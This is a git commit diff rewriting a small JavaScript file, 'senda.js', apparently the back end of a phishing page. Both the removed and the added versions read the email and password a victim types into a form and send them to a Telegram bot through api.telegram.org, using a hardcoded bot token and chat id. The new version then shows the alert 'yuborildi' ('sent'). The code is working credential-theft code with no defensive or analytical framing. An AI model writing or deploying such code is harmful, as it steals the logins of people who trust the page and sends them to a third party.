6144206ebb69150309ec588570bf52e4f990333a
papnlp <134606998+papnlp@users.noreply.github.com>
2023-06-08 06:40:51 -1000

    Update senda.js

--- fodn/senda.js
+++ fodn/senda.js
@@ -1,26 +1,14 @@
-const token = <<5903216139:AAGOMD7unyFYiCTiSYFM4Z0-ctRQyX2yc2E>>
-const chat_id = <<1657791509>>
-
-function sendForm()
-{
-     let formData = JSON.stringify($("#stdFord").serializeArray(),'email','pasD');
-     
-     const request = new Request(
-          `https://api.telegram.org/bot${token}/sendMessage`,
-          {
-               method: 'POST',
-               body: formData,
-               headers: {
-                     'Content-Type': 'application/json',
-                     'accept': 'application/json',
-               }
-          },
-     );
-
-     fetch(request)
-        .then(result => result.json())
-        .then(data => {
-             console.log(data);
-        })
-        .catch(error => console.log('Error', error));
-}
+<script>
+    let chat_id = "1657791509";
+    let bot_token = "5903216139:AAGOMD7unyFYiCTiSYFM4Z0-ctRQyX2yc2E";
+    function getChat() {
+        let text1 = document.forms["myForm"]["email"].value;
+        let text2 = document.forms["myForm"]["pasD"].value;
+        let my_text = "Email: " + text1 + "  Password: " + text2;
+        var url = `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
+        let api = new XMLHttpRequest();
+        api.open("GET", url, true);
+        api.send();
+        alert("yuborildi");
+    }
+</script>
